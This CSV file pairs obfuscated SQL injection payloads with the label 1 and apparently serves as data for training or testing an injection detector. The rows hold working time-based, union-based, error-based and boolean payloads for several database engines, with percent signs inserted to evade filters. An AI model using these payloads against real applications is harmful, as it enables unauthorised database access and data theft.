Query,Label
"1"" wh%e%re 2309  =  2309 o%%r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
%s%%e%l%ec%t   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as %i%%nt  )  /  (  %s%%e%l%ec%t 0 fr%%om dual  )   end  )   fr%%om dual--,1
1'  )   waitfo%r delay '0:0:5' a%%n%%d   (  'vtfs'  =  'vtfs,1
%se%%l%e%%c%%t   (  case when   (  8711  =  6432  )   then 1 else 8711*  (  %se%%l%e%%c%%t 8711 %f%%rom master..sysd%a%%t%%ab%%a%%s%es  )   end  )  --,1
"-8238'   )    )    %%u%%nio%%n all %%s%%e%%l%e%ct 9797,9797,9797,9797,9797,9797,9797,9797#",1
-8504 wh%%er%e 3086  =  3086 %o%r 1131  =  9188#,1
"1'  )   w%h%%e%%re 6772  =  6772 %a%n%%d row  (  6237,7469  )  >  (  s%e%%le%ct count  (  *  )  ,concat  (  0x7171706a71,  (  s%e%%le%ct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo%r  (  r%a%n%%d  (  0  )  *2   )    )   x %%fr%%o%%m   (  s%e%%le%ct 5192 %u%nio%%n s%e%%le%ct 3785 %u%nio%%n s%e%%le%ct 3931 %u%nio%%n s%e%%le%ct 7158  )  a group by x  )  --",1
1 %w%%h%e%%r%e 6036  =  6036 %%a%nd 7533  =  7533--,1
1%'   )    )     )   a%%nd 6240  =    (  'qqpjq'||  (  sel%e%c%t case 6240 when 6240 then 1 else 0 end fr%%o%m rdb$d%a%%ta%%b%as%e  )  ||'qzvzq'  )   a%%nd    (    (     (  '%'  =  ',1
-8409   )    )    as ipbz w%%h%e%re 9984  =  9984 %%or 3371  =  3869,1
1'   )    )    as pqbq %w%%he%%r%e 1865  =  1865,1
"1""  )   %w%%h%er%e 4822  =  4822 %un%%i%on all %se%%l%%e%%c%%t %%nul%l,%%nul%l,%%nul%l,%%nul%l,%%nul%l,%%nul%l,%%nul%l,%%nul%l,%%nul%l,%%nul%l--",1
"s%e%%l%e%c%%t dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   f%ro%m dual %an%d   (  'qomf' %%like 'qomf",1
"1'   )    )    %un%%i%%o%n all s%%ele%%c%%t %%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l--",1
"%s%el%%ec%%t count  (  *  )   f%%r%o%m doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.t%%abl%%es as t3 an%d    (    (     (  'ctbs' %l%i%k%%e 'ctbs",1
"-6611%""   )    )     )   %%u%%n%i%%on all %s%e%%le%%c%%t 8918,8918#",1
"call regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%u%ll  )  ,0  )  ,500000000  )  ,n%%u%ll  )   and    (    (     (  ""lzyl"" %l%%i%k%%e ""lzyl",1
"1'   )    )    as hrra %%whe%r%%e 9533  =  9533 %%a%n%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%nu%%l%l  )  ,0  )  ,500000000  )  ,%nu%%l%l  )  --",1
1%' r%%l%%ik%e sleep  (  5  )  #,1
1%' %%o%%r sleep  (  5  )   a%%n%%d '%'  =  ',1
"1  )   %and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substr%ing  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,n%%ul%%l  )  --",1
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%null  )   %%a%nd    (    (   'xuwl' %%l%%i%ke 'xuwl",1
"-9156'   )    )    u%n%%io%%n all %%s%%e%%l%ec%%t 9110,9110,9110,9110#",1
"1%'   )    )     )   a%n%d make_%se%%t  (  1543  =  5817,5817  )   a%n%d    (    (     (  '%'  =  '",1
"1 w%h%%er%%e 7072  =  7072 %o%r row  (  1045,7562  )  >  (  %s%%e%l%e%%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %s%%e%l%e%%c%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%o%r  (  r%%a%%n%d  (  0  )  *2   )    )   x f%%r%o%m   (  %s%%e%l%e%%c%%t 8488 %un%%i%on %s%%e%l%e%%c%%t 5584 %un%%i%on %s%%e%l%e%%c%%t 3051 %un%%i%on %s%%e%l%e%%c%%t 1210  )  a group %%b%%y x  )  --",1
"1' %and 9254  =    (  s%el%e%%c%t count  (  *  )   %%f%%r%%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1  )   w%h%e%%r%%e 8433  =  8433 r%l%%i%k%%e   (  s%%e%%l%%ec%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
"1  )   %%w%%h%e%r%e 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  se%l%%ec%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"-8640  )   %%or elt  (  7657  =  5020,5020  )   %%and   (  2346  =  2346",1
 (  %%s%el%%e%c%%t * f%rom   (  %%s%el%%e%c%%t  (  sleep  (  5   )    )     )  srmq  )   %%a%%n%d   (  'pgth'  =  'pgth,1
"1""  )   or   (  s%%el%ec%t 2*  (  if   (    (   s%%el%ec%t * f%%r%o%%m   (  s%%el%ec%t concat  (  0x7171706a71,  (  s%%el%ec%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %%an%%d   (  ""mejy""  =  ""mejy",1
"-3775'  )   or 1 group %%b%%y concat  (  0x7171706a71,  (  %s%%el%%ec%%t   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  ra%nd  (  0  )  *2   )    )    hav%i%%ng m%i%%n  (  0  )  #",1
"1"" w%h%e%%re 1234  =  1234",1
"1   )    )     )   %%a%%n%d elt  (  1210  =  1210,sleep  (  5   )    )    %%a%%n%d    (    (     (  2341  =  2341",1
"-2424  )   w%he%%r%%e 8132  =  8132 %o%%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%el%%ect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   %%f%%r%%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1%""   )    )     )   %an%%d 4386  =  utl_%i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%e%%l%%ec%%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %f%%ro%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %an%%d    (    (     (  ""%""  =  """,1
"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '",1
"waitf%o%%r delay '0:0:5' a%n%d ""%""  =  """,1
 (  s%e%%le%%c%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s%e%%le%%c%t   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,1
"1%""   )    )     )   %u%nion all s%%e%%l%e%%ct nu%l%%l,nu%l%%l,nu%l%%l#",1
1  )   w%%h%er%e 6725  =  6725 a%%n%d 1553  =  7419,1
"1""  )  ",1
1' %%wh%e%re 1557  =  1557,1
"-2246""   )    )    %u%ni%o%%n all s%%e%le%c%t 4613,4613,4613,4613,4613,4613#",1
"%s%%e%%l%e%%c%t count  (  *  )   f%r%om sysibm.sys%t%a%%bl%%es as t1,sysibm.sys%t%a%%bl%%es as t2,sysibm.sys%t%a%%bl%%es as t3 %%an%d   (  'cxjp'  =  'cxjp",1
"-2726""   )    )    %o%r elt  (  1032  =  1032,3623  )   a%n%d    (    (   ""ococ""  =  ""ococ",1
"1'   )    )    a%n%%d 6414  =    (  %se%lec%t count  (  *  )   %f%%r%om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   a%n%%d    (    (   'rqbf'  =  'rqbf",1
1%' waitf%o%%r delay '0:0:5' %%a%%nd '%'  =  ',1
"1%"" r%l%%i%%ke   (  s%%e%%le%c%t * %f%%rom   (  s%%e%%le%c%t  (  sleep  (  5   )    )     )  vwyq  )  #",1
"1""  )   a%%n%d 6969  =    (  %%s%%e%%le%%c%%t 6969 %%fro%%m pg_sleep  (  5   )    )    a%%n%d   (  ""cjkk"" l%i%ke ""cjkk",1
1%'   )    )     )   %%an%d sleep  (  5  )  #,1
"1""  )   as hblk %%w%%he%%re 7982  =  7982 %%a%%n%%d 9611  =  6142--",1
"-7845' %%un%ion all %s%%e%%l%%ect 9574,9574,9574,9574,9574,9574#",1
"1',  (  case when 8260  =  8260 then 1 else n%%ul%l end  )  ",1
end %%a%%nd    (    (   6874  =  6874,1
"-2122""  )   as zytb %%w%he%r%%e 7025  =  7025 %%or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%%l%e%%c%t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   f%%r%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1"" %w%%he%r%%e 8734  =  8734",1
"1""  )   an%d 8407  =    (  %%s%%e%%l%%e%%c%t count  (  *  )   %f%r%%om generate_series  (  1,5000000   )    )    an%d   (  ""wmmg"" %%l%i%%ke ""wmmg",1
"-1597"" %%w%%h%%ere 5933  =  5933 or 3038  =  3038",1
1'   )    )     )   rlik%e   (  %%se%l%e%c%%t * f%r%%o%%m   (  %%se%l%e%c%%t  (  sleep  (  5   )    )     )  sgvo  )   %a%n%d    (    (     (  'wuux'  =  'wuux,1
"1'  )   a%nd 5556  =    (  %%s%%e%lec%%t count  (  *  )   %%f%%r%%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
"1""  )   as tuem %%w%%h%ere 1328  =  1328",1
"1%'   )    )     )   o%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%%u%%l%%l  )  ,0  )  ,500000000  )  ,%%n%%u%%l%%l  )   an%%d    (    (     (  '%'  =  '",1
1' %%a%nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%%elec%%t   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fr%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
"1 a%n%%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%nu%l%%l  )  ,0  )  ,500000000  )  ,%nu%l%%l  )  ",1
"1  )   %%o%%r 9643  =    (  %s%%el%ec%%t count  (  *  )   %f%%r%o%m doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.%t%%ab%%l%%es as t3  )   %%and   (  3814  =  3814",1
"-9860  )   %w%%h%%e%%r%%e 8743  =  8743 %u%n%i%on all s%%e%lec%%t 8743,8743,8743,8743,8743,8743,8743--",1
"1""  )   r%%l%%i%k%e   (  s%el%ect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    %and   (  ""rkvr""  =  ""rkvr",1
"1""   )    )    as nwnp %wh%%e%r%%e 6140  =  6140",1
"1  )   %%o%%r 7417  =    (  %%se%%le%c%%t count  (  *  )   %fr%om sysibm.sys%tab%l%es as t1,sysibm.sys%tab%l%es as t2,sysibm.sys%tab%l%es as t3  )  --",1
-3861'  )   as zmja %%whe%re 4036  =  4036 or 9323  =  9323#,1
"-1305  )   %%o%r make_s%e%%t  (  2298  =  5545,5545  )   %a%nd   (  6715  =  6715",1
1'+  (  %s%%el%e%c%%t dpkp w%%h%er%e 4836  =  4836 %%a%n%%d sleep  (  5   )    )   +',1
"-1631%""  )   %%or elt  (  8285  =  1709,1709  )   %%a%n%d   (  ""%""  =  """,1
waitf%o%r delay '0:0:5'--,1
%%s%el%ec%t   (  case when   (  9299  =  2760  )   then 1 else 9299*  (  %%s%el%ec%t 9299 f%r%%om master..sys%%d%at%%a%b%%a%s%%es  )   end  )  --,1
1'||  (  se%%l%%e%%c%t 'brsr' %w%%he%%r%%e 5458  =  5458,1
"%s%e%%le%%ct count  (  *  )   %fr%om generate_series  (  1,5000000  )   a%n%%d   (  ""%""  =  """,1
"iif  (  8214  =  4954,1,1/0  )  ",1
"1'+  (  %%s%e%%lec%%t 'zkuf' wh%%ere 3591  =  3591 %%o%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%%ul%l  )  ,0  )  ,500000000  )  ,%n%%ul%l   )    )   +'",1
1   )    )    a%n%d 2006  =  2006,1
1'+  (  s%e%l%ec%%t 'uqaf' %w%%h%er%e 7414  =  7414,1
"1"" %%w%h%er%e 9889  =  9889",1
"1%"" %o%%r 4915  =    (  %%s%%ele%%ct count  (  *  )   %f%r%%o%m domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.t%abl%%es as t3  )  --",1
"1'   )    )     )   %%o%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %%sel%%e%%c%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    %%a%nd    (    (     (  'dqjq'  =  'dqjq",1
"1%' or 5286  =    (  %%se%%lec%t count  (  *  )   %%f%%r%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   a%%n%d '%'  =  '",1
"%%se%%l%e%c%t count  (  *  )   %%fr%%o%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %and    (    (   '%'  =  '",1
1'  )   %%o%r   (  %%s%e%l%%e%%c%t * %from   (  %%s%e%l%%e%%c%t  (  sleep  (  5   )    )     )  ydpu  )   %an%%d   (  'dqoz' li%%k%%e 'dqoz,1
1   )    )     )   an%%d   (  %s%%e%lect * %%fr%om   (  %s%%e%lect  (  sleep  (  5   )    )     )  fzno  )   an%%d    (    (     (  1601  =  1601,1
"-4166%""  )   %u%%n%ion all %sele%%c%t 5190--",1
"%s%%el%%ec%t dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   %%fr%om dual %a%%nd    (    (   '%'  =  '",1
"1%""   )    )    %%and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%nu%l%l  )  ,0  )  ,500000000  )  ,%nu%l%l  )  --",1
"1'  )   %%or exp  (  ~  (  %s%e%l%ec%%t * f%r%o%%m   (  %s%e%l%ec%%t concat  (  0x7171706a71,  (  %s%e%l%ec%%t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    %%a%%nd   (  'nopu'  =  'nopu",1
"1'   )    )    as rxhe %%w%h%%e%re 3838  =  3838 %%or 7417  =    (  s%e%%le%ct count  (  *  )   fr%%o%m sysibm.syst%%a%%b%l%es as t1,sysibm.syst%%a%%b%l%es as t2,sysibm.syst%%a%%b%l%es as t3  )  --",1
"1""   )    )    as hdyn %%w%%h%%e%%re 6027  =  6027 %un%%i%on all %s%%e%l%%ec%%t %%n%u%ll,%%n%u%ll,%%n%u%ll--",1
"1'  )   as wnyl %%w%h%e%r%%e 8978  =  8978 %or 5286  =    (  %se%%le%%ct count  (  *  )   %%f%%r%%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1' o%r 7552  =    (  s%e%%l%%ect count  (  *  )   %%f%%ro%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
"1'||  (  s%e%%le%%ct 'jnsd' %%fr%%o%%m dual %%w%%h%e%r%%e 2316  =  2316 un%i%o%%n all s%e%%le%%ct n%u%ll,n%u%ll,n%u%ll,n%u%ll,n%u%ll,n%u%ll,n%u%ll#",1
"1%"" a%%n%%d row  (  6237,7469  )  >  (  s%%e%le%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  s%%e%le%%c%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%%or  (  ra%%n%%d  (  0  )  *2   )    )   x %f%%ro%%m   (  s%%e%le%%c%t 5192 %%u%%ni%%o%%n s%%e%le%%c%t 3785 %%u%%ni%%o%%n s%%e%le%%c%t 3931 %%u%%ni%%o%%n s%%e%le%%c%t 7158  )  a group b%%y x  )   a%%n%%d ""%""  =  """,1
1'  )   %a%%n%d 6969  =    (  %s%el%%ec%t 6969 f%%r%om pg_sleep  (  5   )    ) ,1
1 %w%%h%%e%%re 8393  =  8393,1
"-2013""   )    )    as k%%i%sy %whe%%r%%e 3802  =  3802 %or 5903  =    (  'qqpjq'||  (  %sele%ct case 5903 when 5903 then 1 else 0 end f%r%o%m rdb$%d%a%%ta%%bas%%e  )  ||'qzvzq'  )  --",1
"1%"" %or 5286  =    (  s%e%l%e%ct count  (  *  )   %%f%ro%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %%a%%n%%d ""%""  =  """,1
-7971' %u%%n%i%o%%n all %sel%e%c%%t 4273#,1
"%se%%l%ect count  (  *  )   %fr%%o%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %an%d ""%""  =  """,1
1'   )    )    %a%%n%d 2401  =  4693 %a%%n%d    (    (   'ssrm'  =  'ssrm,1
"1"" %%an%d 3715 %in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %se%l%%e%%c%%t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
"1%""   )    )    a%%n%%d 6414  =    (  %%s%%e%lec%%t count  (  *  )   %fr%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   a%%n%%d    (    (   ""%""  =  """,1
-9657'  )   as ziiq %w%%h%%e%r%e 7725  =  7725 %%or 3038  =  3038,1
"-6599%""   )    )    o%%r make_%se%%t  (  9354  =  9354,7185  )   a%n%%d    (    (   ""%""  =  """,1
"-2610%""  )   %u%n%i%o%%n all %s%%ele%c%%t 7779,7779,7779,7779,7779--",1
"1'+  (  se%l%ec%t fhbk %w%%h%%e%r%e 2570  =  2570 %%a%nd 5556  =    (  se%l%ec%t count  (  *  )   %from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1
"1   )    )    %%o%r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   a%%n%d    (    (   8554  =  8554",1
"1%""  )   o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%i%%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%%n%ull  )   %a%%n%d   (  ""%""  =  """,1
"1  )   %w%%h%e%%r%%e 7425  =  7425 %un%io%%n all %%s%e%%l%%e%c%t nu%%l%l,nu%%l%l,nu%%l%l,nu%%l%l,nu%%l%l,nu%%l%l,nu%%l%l,nu%%l%l,nu%%l%l,nu%%l%l--",1
"1'   )    )    %%a%n%%d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'  )   %%or 6979  =  %l%i%k%e  (  'abcdefg',upper  (  hex  (  ra%ndomblob  (  500000000/2   )    )      )    )   --",1
"-7233""  )   %wh%%e%%re 7574  =  7574 %%o%r 5821  =  3288",1
"-4927'   )    )    %u%%ni%%o%n all %s%e%%le%c%t 1924,1924#",1
"1 %%a%nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1"" %an%d 8514  =    (  %%s%el%ec%%t count  (  *  )   f%r%%o%m domai%%n.domai%%ns as t1,domai%%n.columns as t2,domai%%n.%t%%abl%%es as t3  )   %an%d ""rntg"" li%k%e ""rntg",1
"1""   )    )    %a%%n%%d   (  %%s%e%%le%%ct * %%f%ro%m   (  %%s%e%%le%%ct  (  sleep  (  5   )    )     )  fzno  )   %a%%n%%d    (    (   ""ykhp"" %lik%e ""ykhp",1
"1'  )   %o%%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri%%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,n%u%l%l  )   %an%%d   (  'wdru' %%l%%ik%e 'wdru",1
"1%""  )   %%u%%n%io%%n all %se%%l%e%c%%t n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l--",1
"1'||  (  %%s%e%lect 'pvmz' f%%r%%om dual %w%h%%ere 1090  =  1090 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %%s%e%lect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",1
"1""  )   a%n%d elt  (  1889  =  7397,7397  )   a%n%d   (  ""kuau""  =  ""kuau",1
"1'   )    )     )   u%n%i%o%%n all %s%%e%l%e%c%%t nu%%l%%l,nu%%l%%l,nu%%l%%l#",1
"waitfor delay '0:0:5' %a%n%d    (    (     (  ""mfro"" %%l%i%%ke ""mfro",1
1   )    )    as zpvn %%w%%h%%e%%r%e 2767  =  2767 r%lik%e   (  %%se%l%e%%c%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
"-4964""   )    )    %u%%n%ion all %sel%ec%%t 4750,4750,4750,4750,4750--",1
"1%' %a%%n%d elt  (  4249  =  4249,7259  )   %a%%n%d '%'  =  '",1
1   )    )    as ehlg wh%%e%%re 6340  =  6340,1
"1,  (  %se%lec%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%lec%t   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   %f%%ro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %f%%ro%m dual  )  ",1
"s%%e%lec%%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",1
"s%%el%%e%c%%t count  (  *  )   fr%%o%%m generate_series  (  1,5000000  )   %%a%%nd    (    (     (  ""%""  =  """,1
"1%""   )    )     )   a%nd 3116  =  9088#",1
1'   )    )    an%d 3754  =    (  %%se%%l%%e%c%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%%l%%e%c%t   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   fr%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fr%om dual  )   an%d    (    (   'opyp'  =  'opyp,1
"1%'  )   %%o%r 7552  =    (  s%%el%e%c%%t count  (  *  )   %%fr%%o%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   %%an%%d   (  '%'  =  '",1
"1 %%or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",1
"1  )   as rtpl %%w%h%e%%re 1262  =  1262 a%%n%d 3202  =  %li%ke  (  'abcdefg',upper  (  hex  (  ra%%n%domblob  (  500000000/2   )    )      )    )   --",1
"1%'  )   %%u%n%%i%%on all %%s%e%l%e%ct %n%%u%l%%l,%n%%u%l%%l,%n%%u%l%%l--",1
"1   )    )    as rpwt %%w%he%%re 4103  =  4103 a%n%%d 3580  =    (  %%s%ele%%ct count  (  *  )   fro%m doma%%i%n.doma%%i%ns as t1,doma%%i%n.columns as t2,doma%%i%n.%t%ab%les as t3  )  --",1
-4108'  )   o%%r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s%%e%le%%c%%t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %an%d   (  'tqjx'  =  'tqjx,1
"1""   )    )    as itxo wh%e%r%e 7916  =  7916",1
"1   )    )    %o%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%n%u%%l%l  )  --",1
"1 %w%%h%e%%r%e 5081  =  5081 %%o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nu%%l%%l  )  --",1
1'+  (  %se%l%e%c%t 'unpz' %w%%h%%e%%r%%e 8186  =  8186,1
"-5124'+  (  %s%e%%le%%c%t 'xpww' %wh%%ere 1752  =  1752 u%n%i%on all %s%e%%le%%c%t 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",1
"1""  )   w%%her%%e 9461  =  9461 %%un%i%%on all %s%%e%le%%c%%t %%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l,%%n%u%%l%l#",1
1  )   as hvsk %wh%ere 7902  =  7902,1
1'  )   as bscn %w%he%re 6907  =  6907,1
-7453'   )    )     )   %o%%r 8571  =  8571--,1
1' w%%he%%r%e 2134  =  2134 rl%%i%k%e   (  %%s%%el%ec%t   (  case when   (  3613  =  2090  )   then 1 else 0x28 end   )    )   --,1
"1""   )    )    as vxkn %wh%e%r%%e 2443  =  2443 %%o%%r 4411  =    (  %%s%elect count  (  *  )   %%f%rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
se%l%%e%%ct   (  case when   (  5009  =  1133  )   then 5009 else 5009*  (  se%l%%e%%ct 5009 %fr%%o%m %%information_schema.character_s%e%%ts  )   end  )  #,1
